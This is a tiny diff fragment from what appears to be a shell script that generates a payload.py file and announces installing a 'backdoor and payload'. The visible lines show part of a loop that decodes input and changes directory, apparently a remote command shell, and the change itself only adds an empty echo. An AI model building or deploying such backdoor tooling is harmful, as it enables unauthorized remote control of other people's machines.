@@ -118,3 +118,4 @@ while 1:
     open = open.decode()
     os.chdir(open)" > payload.py
 echo "Done.. Now install backdoor and payload"
+echo ""
